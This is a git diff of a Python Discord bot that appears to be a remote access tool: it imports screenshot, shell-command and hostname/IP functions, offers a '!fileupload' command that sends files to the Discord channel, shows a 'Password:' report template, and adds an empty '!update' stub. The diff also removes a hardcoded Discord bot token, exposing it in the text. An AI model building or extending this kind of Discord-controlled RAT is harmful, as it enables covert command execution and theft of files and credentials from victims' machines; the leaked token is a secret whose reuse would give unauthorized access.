@@ -4,11 +4,15 @@ from pyautogui import screenshot, size
 from io import BytesIO
 from subprocess import check_output, STDOUT
 from socket import gethostname, gethostbyname
-import discord, webbrowser
+import discord, webbrowser, os
+from dotenv import load_dotenv
+
+load_dotenv()
 
 print(f'Loading...')
 
 parse = lambda inputStr: [{key: input_dict[key][i] for key in input_dict} for i in range(len(input_dict[list(input_dict.keys())[0]]))] if (input_dict := {key.strip(): values.strip() if key.strip() not in {k.strip() for k, _ in [[line.split(":")[0], ":".join(line.split(":")[1:])] for line in inputStr.split('\n') if ':' in line if line.strip()]} else [v.strip() for k, v in [[line.split(":")[0], ":".join(line.split(":")[1:])] for line in inputStr.split('\n') if ':' in line if line.strip()] if k.strip() == key.strip()] for key, *values in [line.split(':') for line in inputStr.split('\n') if ':' in line if line.strip()]}) else None
+scriptLocation = ""
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -82,7 +86,10 @@ Password: {}
 
         if message.content.startswith(('!fileupload', '!fu')):
             await ctx.send(file=" ".join(args))
-        
+
+        if message.content.startswith(('!update', '!u')):
+            pass
+
         if message.content == "!exit":
             await ctx.send("Exitting")
             quit()
@@ -90,4 +97,4 @@ Password: {}
     except Exception as err:
         await ctx.send(f"ERROR: {err}")
 
-client.run('MTIwODAzNzcwMzMyNTg1MTY5OA.GXQf7Q.RvIWBRTwFJ4HR_MNba0nBMVHoyKmmDbKOKeqn0', log_handler=None)
+client.run(os.getenv("TOKEN"), log_handler=None)
